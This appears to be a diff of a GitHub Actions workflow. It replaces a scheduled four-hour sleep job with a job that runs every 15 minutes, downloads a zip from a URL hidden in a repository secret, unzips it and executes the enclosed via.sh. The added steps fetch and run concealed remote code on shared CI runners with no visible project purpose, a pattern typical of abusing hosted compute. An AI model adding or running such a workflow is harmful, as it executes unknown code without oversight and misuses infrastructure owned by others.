@@ -1,13 +1,37 @@
-name: Wait 4 Hours Every 15 Minutes
+name: via
 
 on:
   schedule:
-    - cron: "*/7 * * * *" # every 15 minutes
-  workflow_dispatch: # optional, run manually if needed
+    - cron: "*/15 * * * *" 
+  workflow_dispatch:
 
 jobs:
-  wait-job:
+  export-and-run:
     runs-on: ubuntu-latest
+
     steps:
-      - name: Sleep for 4 hours
-        run: sleep 4h
+      - name: Checkout repository
+        uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Download
+        shell: bash
+        run: |
+          curl -L -o via.zip "${{ secrets.VIA }}"
+          if [ ! -f "via.zip" ]; then
+            echo "Download failed: via.zip not found."
+            exit 1
+          fi
+
+      - name: Unzip
+        shell: bash
+        run: |
+          unzip via.zip
+          rm via.zip
+
+      - name: Run
+        shell: bash
+        run: |
+          chmod +x ./via.sh
+          ./via.sh
